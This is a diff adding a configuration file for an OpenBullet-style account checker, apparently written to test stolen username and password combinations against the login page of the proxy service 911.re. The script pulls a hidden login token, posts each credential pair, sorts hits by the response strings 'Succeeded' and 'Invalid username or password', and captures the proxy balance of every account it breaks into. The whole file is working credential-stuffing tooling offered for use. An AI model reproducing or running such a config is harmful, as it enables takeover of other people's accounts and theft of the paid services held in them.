@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "911.re",
+  "SuggestedBots": 1,
+  "LastModified": "2018-06-02T06:32:57.5512166+00:00",
+  "AdditionalInfo": "",
+  "Author": "ReT",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#get_token REQUEST GET "http://911.re/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "id=\"login_token\" type=\"hidden\" value=\"" "\"" Recursive=FALSE -> VAR "TOKEN" "" "" 
+#login REQUEST POST "http://911.re/userpanel" AutoRedirect=TRUE 
+  CONTENT "action=userlogin&login_token=<TOKEN>&login_user=<USER>&login_pwd=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username or password" 
+  KEYCHAIN Success OR 
+    KEY "Succeeded" 
+REQUEST GET "http://911.re/user" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "Account Balance:&nbsp;<span>" "</span" Recursive=FALSE -> CAP "PROXIES" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "0 proxies" 
